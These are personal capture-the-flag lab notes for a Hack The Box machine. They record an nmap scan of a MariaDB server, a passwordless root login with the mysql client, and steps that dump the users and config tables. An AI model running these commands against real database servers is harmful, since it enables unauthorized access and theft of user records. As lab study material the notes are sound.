#HTB 
# Enumeration
Target info:

	Target IP: 10.129.123.78
	Hosting: MariaDB mysql
	mysql-info:
	Protocol: 10
	Version:5.5.5-10.3.27-MariaDB-0+deb10u1


## nmap

````
//command:
nmap -A -p 010000-oN nmap. txt 10.129.123.78

//output:

- PORT STATE SERVICE VERSION
3306/tcp open mysql?

mysql-info:
Protocol: 10
Version:5.5.5-10.3.27-MariaDB-0+deb10u1
Thread ID: 67 C
Capabilities flags: 63486

````

| Open port | Service |
| --------- | ------- |
| 3306      | mysql   |

# Main Issue
root User Authentication provided without supplying a password

#SQL #DatabaseDump

	command to authenticate:
	.
	mysql -u root -h [IP ADDRESS]

# Exploit

>You'll need some knoledge of SQL queries to inject SQL commands 

1. Access : `mysql-u root-h 10.129.123.78 `

2. Show all databases: `show databases;`
	>Database:
>  htb
	information schema
	mysql
	performance_schema 

3. Select htb -> `use htb;`
>Database changed
>MariaDB [htb]>

4. Show Tables -> `show tables;`
>config
>users

5. Dump users -> `SELECT * from users;`
> admin admin@sequel.htb
	lara lara@sequel.htb
	DWN sam sam@sequel.htb
	mary mary@sequel.htb

6. Dump config -> `Select * from config;`
![[SELECT * from config.png]]